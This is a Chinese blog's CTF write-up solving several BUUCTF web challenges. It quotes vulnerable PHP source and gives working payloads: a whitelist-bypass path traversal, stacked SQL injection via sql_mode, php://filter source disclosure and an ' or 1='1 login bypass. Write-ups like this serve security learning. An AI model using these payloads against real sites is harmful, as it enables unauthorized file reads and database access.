@@ -1,0 +1,745 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    
+
+    <title>BUUCTF Write Up | 2h0nG&#39;s Blog</title>
+    <meta name="author" content="John Doe">
+    
+    <meta name="description" content="Love is friendship fell into love">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="BUUCTF Write Up"/>
+    <meta property="og:site_name" content="2h0nG&#39;s Blog"/>
+
+    
+    <meta property="og:image" content=""/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="2h0nG&#39;s Blog" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/prettify-tomorrow-night-eighties.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+
+<body>
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="indigo">
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">2h0nG&#39;s Blog</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            首页
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            归档
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            分类
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-reading " href="/reading" >
+                            <i class="fa fa-book "></i>
+                            
+                            读书
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-about " href="/about" >
+                            <i class="fa fa-user "></i>
+                            
+                            关于
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            搜索
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-1" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="http://ww2.sinaimg.cn/small/74990035jw1f1rjkd681bj20rs0rsdhg.jpg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">2h0nG</p>
+                        <p class="desc">不断学习中</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    首页
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    归档
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    分类
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-reading " href="/reading" >
+                    <i class="fa fa-book "></i>
+                    
+                    读书
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-about " href="/about" >
+                    <i class="fa fa-user "></i>
+                    
+                    关于
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    搜索
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-1" id="category-menu">
+    
+
+            
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/数据通信安全/">
+                    数据通信安全 <span class="right">30 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/代码审计安全/">
+                    代码审计安全 <span class="right">10 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Linux系统安全/">
+                    Linux系统安全 <span class="right">12 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Web渗透测试/">
+                    Web渗透测试 <span class="right">26 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/CTF笔记/">
+                    CTF笔记 <span class="right">16 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Python学习/">
+                    Python学习 <span class="right">3 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Leetcode题解/">
+                    Leetcode题解 <span class="right">24 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/漏洞复现与分析/">
+                    漏洞复现与分析 <span class="right">1 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/数据恢复/">
+                    数据恢复 <span class="right">2 篇</span></a>
+                </a>
+            </li>
+
+        
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">搜索</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
+        <div class="container main-container">
+    <nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo">
+        <span class="breadcrumb">当前位置（分类目录）</span>
+        
+            
+    
+    
+    <a class="breadcrumb" href="/categories/CTF笔记/">CTF笔记</a>
+
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+        <div class="card-content">
+            
+
+            <div class="article-title">
+                
+    
+        <h1>BUUCTF Write Up</h1>
+    
+
+
+            </div>
+            <time class="pink-link-context" datetime="2020-09-13T08:08:22.520Z"><a href="/2020/09/13/CTF%E7%AC%94%E8%AE%B0/BUUCTF%20Write%20Up/">2020-09-13</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/CTF笔记/" class="chip pink lighten-1">CTF笔记</a>
+        
+    </div>
+
+
+            <div class="toc pink-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#BUUCTF-Write-Up"><span class="section table-of-contents-text">BUUCTF Write Up</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%80%E3%80%81-HCTF-2018-Warm-Up"><span class="section table-of-contents-text">一、[HCTF 2018]Warm Up</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E3%80%81-SUCTF-2019-EasySQL1"><span class="section table-of-contents-text">二、[SUCTF 2019]EasySQL1</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#%E8%A7%A3%E6%B3%951%EF%BC%9A"><span class="section table-of-contents-text">解法1：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9A"><span class="section table-of-contents-text">解法2：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="section table-of-contents-text">总结：</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%89%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="section table-of-contents-text">三、[极客大挑战 2019]Secret File</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%9B%9B%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="section table-of-contents-text">四、[极客大挑战 2019]EasySQL</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%94%E3%80%81"><span class="section table-of-contents-text">五、</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%85%AD%E3%80%81"><span class="section table-of-contents-text">六、</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%83%E3%80%81"><span class="section table-of-contents-text">七、</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%85%AB%E3%80%81"><span class="section table-of-contents-text">八、</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B9%9D%E3%80%81-RoarCTF-2019-Easy-Calc1"><span class="section table-of-contents-text">九、[RoarCTF 2019]Easy Calc1</span></a></li></ol></li></ol>
+</div>
+
+
+            <div class="entry pink-link-context">
+                <h2 id="BUUCTF-Write-Up"><a href="#BUUCTF-Write-Up" class="headerlink" title="BUUCTF Write Up"></a>BUUCTF Write Up</h2><h3 id="一、-HCTF-2018-Warm-Up"><a href="#一、-HCTF-2018-Warm-Up" class="headerlink" title="一、[HCTF 2018]Warm Up"></a>一、[HCTF 2018]Warm Up</h3><p>开局一滑稽，源码找玄机。source.php，关键在这里。</p>
+<p>​    审计源码，目的是绕过以下主函数代码，需要传入一个参数file，并且通过字符串检查和一个emmm类中的checkFile方法的检查，最终执行一个include函数，这里明显是通过检查并且通过include读取flag文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>​    审计checkfile方法，发现有一个白名单数组，里面有一个hint.php，打开一看，原来是提示了flag的文件名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>mb_substr(arg1,arg2,arg3)：从arg1中截取arg2-arg3的字符串；mb_strpos(arg1,arg2)：从arg1中找到arg2第一次出现的位置。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];    #白名单</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;    #是否传入参数，是否参数为字符串</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;    #判断参数是否在白名单，如果不在继续判断</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(    #截取第一个?前的值，如果没?，则是整个字符串，因为函数中自己加了一个?</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)    </span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;    #再次判断是否在白名单，如果不在继续判断，这里在?前加一个白名单的值其实就可以构造payload了。</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);    #这里进行一次url解码</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)    #然后截取第一个?前的值判断是否在白名单</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>urldecode解码前的判断就已经可以构造payload了，通过对payload的构造可以实现目录任意穿越读取。不停的尝试，最终读取到flag</p>
+<p>Payload：<code>http://4526f00b-4a4c-435b-9112-69769b94c105.node3.buuoj.cn/source.php?file=hint.php?/../../../../ffffllllaaaagggg</code></p>
+<h3 id="二、-SUCTF-2019-EasySQL1"><a href="#二、-SUCTF-2019-EasySQL1" class="headerlink" title="二、[SUCTF 2019]EasySQL1"></a>二、[SUCTF 2019]EasySQL1</h3><p>nmd，这题头得多铁能猜到后台源码是：<code>select $_POST[&#39;query&#39;]||flag from Flag</code>，这就是大佬的世界？完全没逻辑的猜测。听说CTF现场有源码泄露，但是BUUCTF上没有进行复现，具体怎么泄露的源码也没有找到WriteUp，Ok。</p>
+<p>另外，此题采用<code>mysqli_multi_query()</code>运行SQL语句，所以是可堆叠注入。</p>
+<p>泄露的源码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;&#x2F; a&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;query&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    if(isset($post[&#39;query&#39;]))&#123;</span><br><span class="line">        $BlackList &#x3D; &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;</span><br><span class="line">        &#x2F;&#x2F;var_dump(preg_match(&quot;&#x2F;&#123;$BlackList&#125;&#x2F;is&quot;,$post[&#39;query&#39;]));</span><br><span class="line">        if(preg_match(&quot;&#x2F;&#123;$BlackList&#125;&#x2F;is&quot;,$post[&#39;query&#39;]))&#123;</span><br><span class="line">            &#x2F;&#x2F;echo $post[&#39;query&#39;];</span><br><span class="line">            die(&quot;Nonono.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(strlen($post[&#39;query&#39;])&gt;40)&#123;</span><br><span class="line">            die(&quot;Too long.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql &#x3D; &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        do&#123;</span><br><span class="line">            if($res &#x3D; mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                while($row &#x3D; mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;while(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h4><p><strong>Payload</strong>：<code>*,1</code>  ===&gt;    <code>select *,1||flag from Flag;</code>， </p>
+<p><code>1||flag</code>作为一个结果为boolean类型的值相当于1。（如果是*,0 则0||flag为0false），因此执行核心查询语句<code>select * from Flag</code></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/0fZZNt"><img src="https://s1.ax1x.com/2020/10/13/0fZZNt.png" alt="0fZZNt.png"></a></p>
+<h4 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h4><p>把这个<code>||</code>或字符咱们给它运用上，这里涉及到Mysql的<code>sql_mode</code>的设置，通过变量的方式去配置它。</p>
+<blockquote>
+<p>sql_mode : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的PIPES_AS_CONCAT将 ||视为字符串的连接操作符而非 “或” 运算符 </p>
+</blockquote>
+<p>因此当<code>set sql_mode=PIPES_AS_CONCAT</code>时，这个<code>||</code>就相当于字符串连接函数concat(‘’,’’)辣。</p>
+<p><strong>payload:</strong><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
+<p>相当于：<code>select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</code>，这里<code>1||flag</code> ==&gt; <code>concat(1,&#39;flag&#39;)</code></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/0fZjKg"><img src="https://s1.ax1x.com/2020/10/13/0fZjKg.png" alt="0fZjKg.png"></a></p>
+<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a><strong>总结：</strong></h4><p>希望从这里学习到一些新思路，在遇到堆叠注入有特殊的字符时，可以思考sql_mode这个设置，能否将特殊字符变得合理可利用化。</p>
+<h3 id="三、-极客大挑战-2019-Secret-File"><a href="#三、-极客大挑战-2019-Secret-File" class="headerlink" title="三、[极客大挑战 2019]Secret File"></a>三、[极客大挑战 2019]Secret File</h3><p>​    F12找第一个超链接Archive_room.php，然后有一个button是第二个超链接action.php，点击后发现302直接重定向到了end.php，bp抓包看到了这个神秘得小家伙，secr3t.php。</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/B3RuKx"><img src="https://s1.ax1x.com/2020/10/28/B3RuKx.png" alt="B3RuKx.png"></a></p>
+<p>​    secr3t.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">&quot;../&quot;</span>)||stristr($file, <span class="string">&quot;tp&quot;</span>)||stristr($file,<span class="string">&quot;input&quot;</span>)||stristr($file,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>OK，典型的文件包含，包含一下flag.php，发现没有显示flag，那就filter/convert.base64-encode一下叭。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://6f0fd2e6-afd9-415d-8fd6-4680e8378419.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MDYyNWY3OGItOTVhOC00NGMxLThjNzctOGNhMjBhNTFjNGQ4fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br></pre></td></tr></table></figure>
+
+<p>解码如下，得到福来阁。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;我就在这里&quot;;</span><br><span class="line">                $flag &#x3D; &#39;flag&#123;0625f78b-95a8-44c1-8c77-8ca20a51c4d8&#125;&#39;;</span><br><span class="line">                $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="四、-极客大挑战-2019-EasySQL"><a href="#四、-极客大挑战-2019-EasySQL" class="headerlink" title="四、[极客大挑战 2019]EasySQL"></a>四、[极客大挑战 2019]EasySQL</h3><p>Payload：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://1cd20fd9-e3fc-4a11-bb8e-0f7fe320e955.node3.buuoj.cn/check.php?username=1&amp;password=1<span class="string">&#x27; or 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">flag&#123;bb4a6d90-768f-46e4-9a77-c8972f164c59&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="五、"><a href="#五、" class="headerlink" title="五、"></a>五、</h3><p>开局预测index.php传入file=，是个文件包含接口，file=index.php时网页有点卡，估计是循环包含了，应该用的不是_once函数，filter来base64一波吧。解下flag.php源码如下…</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Can you find out the flag?&quot;</span>;</span><br><span class="line"><span class="comment">//flag&#123;86976d68-2fe1-46be-82fd-a32375998501&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>再看看index.php呢，嘻嘻是include</p>
+<blockquote>
+<p>include与require除了在处理引入文件的方式不同外，最大的区别就是：<br>include在引入不存文件时产生一个警告且脚本还会继续执行，<br>require则会导致一个致命性错误且脚本停止执行。</p>
+<p>节选自：include和require的区别(wwlww)：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wwlww/p/8413347.html">https://www.cnblogs.com/wwlww/p/8413347.html</a></p>
+</blockquote>
